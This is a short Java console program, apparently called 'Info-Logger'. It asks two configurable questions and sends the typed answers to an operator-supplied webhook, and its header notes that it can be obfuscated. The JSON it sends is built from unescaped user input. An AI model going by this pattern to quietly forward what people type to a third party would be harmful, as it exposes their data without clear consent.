/* Coded by @DARKNOSY (https://github.com/DARKNOSY/Info-Logger)
1- Install the JDK package @ https://www.oracle.com/java/technologies/javase-jdk11-downloads.html
2- Fill the info like webhook and questions
3- Open your console and type "javac InfoLogger.java" to compile the file
4- Type java FILENAME to open the compiled script
(you can also obfuscate if you want)
*/

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

public class InfoLogger {
    private static final String WEBHOOK_URL = "INSERT-YOUR-WEBHOOK-HERE"; // INSERT YOUR WEBHOOK HERE
    private static final String AVATAR_URL = "https://avatars.githubusercontent.com/u/109553205?v=4";
    private static final String USERNAME = "Java Info Logger / @DARKNOSY";
    private static final String QUESTION1 = "1st QUESTION: "; // ENTER YOUR FIRST QUESTION HERE
    private static final String QUESTION2 = "Is Java gay?: "; // ENTER YOUR SECOND QUESTION HERE

    public static void main(String[] args) {
        clearConsole();
        setConsoleColor(ConsoleColor.BLUE);
        setConsoleTitle("Java Info-Logger / @DARKNOSY");

        String payload = "{ \"embeds\": [{ \"author\": { \"name\": \"" + USERNAME + "\", \"icon_url\": \"" + AVATAR_URL + "\" },";
    
        Scanner scanner = new Scanner(System.in);
    
        String answer1 = promptForInput(scanner, QUESTION1);
        String answer2 = promptForInput(scanner, QUESTION2);
    
        scanner.close();
    
        payload += "\"fields\": [{ \"name\": \"" + QUESTION1 + "\", \"value\": \"" + answer1 + "\" }, { \"name\": \"" + QUESTION2 + "\", \"value\": \"" + answer2 + "\" }] }] }";
    
        try {
            URL url = new URL(WEBHOOK_URL);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(true);

            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes(payload);
            outputStream.flush();
            outputStream.close();

            int responseCode = connection.getResponseCode();
            clearConsole();
            System.out.println("Success. Response Code: " + responseCode);

            connection.disconnect();
        } catch (IOException e) {
            e.printStackTrace();
        }

        System.exit(0);
    }

    public static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows"))
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            else
                Runtime.getRuntime().exec("clear");
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    public static void setConsoleColor(ConsoleColor color) {
        System.out.print("\033[" + color.getCode() + "m");
    }

    public static void setConsoleTitle(String title) {
        System.out.print("\033]0;" + title + "\007");
    }

    private static String promptForInput(Scanner scanner, String prompt) {
        System.out.print(prompt);
        return scanner.nextLine();
    }

    public enum ConsoleColor {
        RESET(0),
        BLACK(30),
        RED(31),
        GREEN(32),
        YELLOW(33),
        BLUE(34),
        MAGENTA(35),
        CYAN(36),
        WHITE(37);

        private final int code;

        ConsoleColor(int code) {
            this.code = code;
        }

        public int getCode() {
            return code;
        }
    }
}
